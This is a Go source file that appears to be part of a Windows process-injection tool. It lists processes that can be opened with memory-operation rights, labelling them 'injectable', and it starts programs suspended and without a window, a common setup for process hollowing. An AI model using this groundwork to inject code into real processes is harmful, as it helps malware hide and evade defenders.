package main

import (
	"fmt"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
)

func findInjectableProcesses() {
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println(err.Error())
	}

	for _, process := range processes {
		pid := process.Pid()
		processHandle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION, false, uint32(pid))
		if err != nil {
			continue
		} else {
			fmt.Printf("Injectable Process: %sPID%s=%d, %sProcessExe%s=%s\n", green, end, pid, red, end, process.Executable())
		}
		windows.CloseHandle(processHandle)
	}
}

func findProcessNameByPID(pid int) string {
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println(err.Error())
	}

	for _, process := range processes {
		if process.Pid() == pid {
			return process.Executable()
		}
	}

	return ""
}

func createProcess(processName string) *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(processName)

	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(nil, commandLine, nil, nil, false, windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW, nil, nil, &si, &pi)

	if err != nil {
		panic(err)
	}

	return &pi
}
